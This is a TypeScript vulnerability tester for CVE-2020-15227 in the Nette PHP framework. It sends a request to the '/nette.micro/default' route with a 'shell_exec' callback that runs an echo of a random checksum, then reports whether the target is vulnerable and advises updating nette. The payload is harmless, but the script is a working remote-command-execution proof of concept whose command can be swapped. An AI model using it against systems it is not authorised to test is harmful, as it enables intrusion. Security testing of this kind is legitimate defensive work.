/**
 * CVE-2020-15227 vulnerability tester
 *
 * Use at your own risk!
 *
 * 2021 Filip Vottus
 */
import axios, { AxiosResponse } from "axios";
import ch from "checksum";
import { v4 as uuid } from "uuid";
import qs from "qs";
import chalk from "chalk";

const BASE_URL = process.argv[2];
axios.defaults.baseURL = BASE_URL;

const checksum = ch(uuid());

const attackDictionary = () => [
  {
    callback: "shell_exec",
    cmd: `echo '${checksum}';`,
  },
];

const sendRequest = async (url: string, params?: object) => {
  url = `${url}?${qs.stringify(params)}`;
  try {
    const res = await axios.request({ url });
    return res;
  } catch (e) {
    return e.response as AxiosResponse<any>;
  }
};

const sendVulnerability = (params?: object) =>
  sendRequest("/nette.micro/default", params);

const testUrl = async () => {
  const dictionary = attackDictionary();

  const vulnerable: object[] = [];

  for (const attack of dictionary) {
    console.log(
      chalk.red.underline("Callback:"),
      chalk.redBright(attack.callback)
    );
    console.log(chalk.red.underline("Cmd:"), chalk.redBright(attack.cmd));
    console.log("");

    console.log(chalk.yellow.underline("Running the vulnerability:"));
    const res = await sendVulnerability(attack);
    console.log(res.config.url);

    console.log(chalk.yellow.underline("Checking the vulnerability:"));
    console.log(chalk.white("checksum =", chalk.cyan(checksum)));

    const isVulnerable = String(res.data).includes(checksum);
    console.log(
      chalk.white(
        "String(res.data).includes(checksum) =",
        isVulnerable ? chalk.red(isVulnerable) : chalk.green(isVulnerable)
      )
    );

    const notFoundRegex = /(404|Not Found|Error)/gi;
    const matchesNotFoundRegex = notFoundRegex.test(String(res.data));
    console.log(
      chalk.white(`/${notFoundRegex.source}/gi.test(String(res.data)) =`),
      matchesNotFoundRegex
        ? `${chalk.green(matchesNotFoundRegex)} ${chalk.gray(
            "\n(On 404, the website may show the url triggering a false-positive)"
          )}`
        : chalk.red(matchesNotFoundRegex)
    );

    if (isVulnerable) {
      vulnerable.push(attack);
    }
  }

  console.log("");

  console.log(
    vulnerable.length > 0
      ? chalk.bgRed.black(
          "The website is vulnerable! Update nette/application or nette/nette!"
        )
      : console.log(
          chalk.bgGreen.black("The website is secured against this attack!")
        )
  );

  return vulnerable.length > 0;
};

testUrl();

export default testUrl;
